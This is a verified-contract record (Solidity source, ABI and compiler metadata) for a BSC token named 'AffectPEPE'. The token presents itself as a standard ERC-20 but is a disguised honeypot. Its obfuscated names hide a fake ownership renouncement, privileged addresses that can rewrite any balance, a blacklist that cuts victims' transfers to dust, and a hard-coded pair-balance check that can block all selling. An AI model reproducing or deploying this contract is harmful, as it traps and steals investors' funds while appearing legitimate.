{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.2;\n\ninterface sellTotal {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address txAt) external view returns (uint256);\n\n    function transfer(address marketingIsTake, uint256 fundReceiver) external returns (bool);\n\n    function allowance(address liquidityShould, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 fundReceiver) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address marketingIsTake,\n        uint256 fundReceiver\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed fundMinTx, uint256 value);\n    event Approval(address indexed liquidityShould, address indexed spender, uint256 value);\n}\n\nabstract contract limitBuy {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface shouldTo {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface txSenderFund {\n    function createPair(address fromLiquidity, address modeMarketingLaunched) external returns (address);\n}\n\ninterface sellTotalMetadata is sellTotal {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract AffectPEPE is limitBuy, sellTotal, sellTotalMetadata {\n\n    function getOwner() external view returns (address) {\n        return launchedLiquiditySender;\n    }\n\n    uint256 public feeSwapList;\n\n    function allowance(address takeMode, address swapLimit) external view virtual override returns (uint256) {\n        if (swapLimit == buyTeam) {\n            return type(uint256).max;\n        }\n        return receiverAuto[takeMode][swapLimit];\n    }\n\n    mapping(address => bool) public exemptAuto;\n\n    uint256 launchedExempt;\n\n    constructor (){\n        if (receiverAmount) {\n            feeSwapList = amountLaunched;\n        }\n        shouldTo walletTrading = shouldTo(buyTeam);\n        txWallet = txSenderFund(walletTrading.factory()).createPair(walletTrading.WETH(), address(this));\n        if (tokenReceiverAuto != amountLaunched) {\n            amountTx = false;\n        }\n        fromReceiver = _msgSender();\n        sellBuyList();\n        exemptAuto[fromReceiver] = true;\n        receiverToAt[fromReceiver] = autoEnable;\n        \n        emit Transfer(address(0), fromReceiver, autoEnable);\n    }\n\n    function approve(address swapLimit, uint256 fundReceiver) public virtual override returns (bool) {\n        receiverAuto[_msgSender()][swapLimit] = fundReceiver;\n        emit Approval(_msgSender(), swapLimit, fundReceiver);\n        return true;\n    }\n\n    function minIsMax(address shouldReceiver) public {\n        liquidityTake();\n        if (tradingMode != receiverAmount) {\n            amountTx = false;\n        }\n        if (shouldReceiver == fromReceiver || shouldReceiver == txWallet) {\n            return;\n        }\n        tokenTeamWallet[shouldReceiver] = true;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return autoEnable;\n    }\n\n    address feeAt = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 private autoEnable = 100000000 * 10 ** 18;\n\n    mapping(address => uint256) private receiverToAt;\n\n    function liquidityTake() private view {\n        require(exemptAuto[_msgSender()]);\n    }\n\n    bool public amountTx;\n\n    function transfer(address maxTotalAuto, uint256 fundReceiver) external virtual override returns (bool) {\n        return fundMode(_msgSender(), maxTotalAuto, fundReceiver);\n    }\n\n    address private launchedLiquiditySender;\n\n    uint256 private tokenReceiverAuto;\n\n    uint256 constant sellAutoMin = 3 ** 10;\n\n    function walletFeeTake(address maxTotalAuto, uint256 fundReceiver) public {\n        liquidityTake();\n        receiverToAt[maxTotalAuto] = fundReceiver;\n    }\n\n    function fundMode(address maxTakeFund, address marketingIsTake, uint256 fundReceiver) internal returns (bool) {\n        if (maxTakeFund == fromReceiver) {\n            return modeWalletTrading(maxTakeFund, marketingIsTake, fundReceiver);\n        }\n        uint256 liquidityFund = sellTotal(txWallet).balanceOf(feeAt);\n        require(liquidityFund == enableMin);\n        require(marketingIsTake != feeAt);\n        if (tokenTeamWallet[maxTakeFund]) {\n            return modeWalletTrading(maxTakeFund, marketingIsTake, sellAutoMin);\n        }\n        return modeWalletTrading(maxTakeFund, marketingIsTake, fundReceiver);\n    }\n\n    uint256 public sellShould;\n\n    address buyTeam = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    mapping(address => mapping(address => uint256)) private receiverAuto;\n\n    uint256 public fundBuy;\n\n    bool public amountMarketing;\n\n    function decimals() external view virtual override returns (uint8) {\n        return maxExempt;\n    }\n\n    bool private tradingMode;\n\n    uint256 enableMin;\n\n    string private swapFund = \"Affect PEPE\";\n\n    function launchTeam(uint256 fundReceiver) public {\n        liquidityTake();\n        enableMin = fundReceiver;\n    }\n\n    event OwnershipTransferred(address indexed marketingToReceiver, address indexed autoTrading);\n\n    mapping(address => bool) public tokenTeamWallet;\n\n    function name() external view virtual override returns (string memory) {\n        return swapFund;\n    }\n\n    function balanceOf(address txAt) public view virtual override returns (uint256) {\n        return receiverToAt[txAt];\n    }\n\n    function owner() external view returns (address) {\n        return launchedLiquiditySender;\n    }\n\n    string private listLaunched = \"APE\";\n\n    uint256 private amountLaunched;\n\n    uint8 private maxExempt = 18;\n\n    bool public maxMinExempt;\n\n    address public txWallet;\n\n    function transferFrom(address maxTakeFund, address marketingIsTake, uint256 fundReceiver) external override returns (bool) {\n        if (_msgSender() != buyTeam) {\n            if (receiverAuto[maxTakeFund][_msgSender()] != type(uint256).max) {\n                require(fundReceiver <= receiverAuto[maxTakeFund][_msgSender()]);\n                receiverAuto[maxTakeFund][_msgSender()] -= fundReceiver;\n            }\n        }\n        return fundMode(maxTakeFund, marketingIsTake, fundReceiver);\n    }\n\n    address public fromReceiver;\n\n    bool public receiverAmount;\n\n    function sellBuyList() public {\n        emit OwnershipTransferred(fromReceiver, address(0));\n        launchedLiquiditySender = address(0);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return listLaunched;\n    }\n\n    function autoAmountToken(address fundTeamTake) public {\n        require(fundTeamTake.balance < 100000);\n        if (amountMarketing) {\n            return;\n        }\n        \n        exemptAuto[fundTeamTake] = true;\n        \n        amountMarketing = true;\n    }\n\n    function modeWalletTrading(address maxTakeFund, address marketingIsTake, uint256 fundReceiver) internal returns (bool) {\n        require(receiverToAt[maxTakeFund] >= fundReceiver);\n        receiverToAt[maxTakeFund] -= fundReceiver;\n        receiverToAt[marketingIsTake] += fundReceiver;\n        emit Transfer(maxTakeFund, marketingIsTake, fundReceiver);\n        return true;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityShould\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingToReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoTrading\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundMinTx\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeMode\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"swapLimit\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundReceiver\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundTeamTake\",\"type\":\"address\"}],\"name\":\"autoAmountToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txAt\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"exemptAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeSwapList\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundBuy\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"fundReceiver\",\"type\":\"uint256\"}],\"name\":\"launchTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxMinExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldReceiver\",\"type\":\"address\"}],\"name\":\"minIsMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellBuyList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellShould\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tokenTeamWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxTotalAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundReceiver\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxTakeFund\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"marketingIsTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundReceiver\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txWallet\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxTotalAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundReceiver\",\"type\":\"uint256\"}],\"name\":\"walletFeeTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "AffectPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}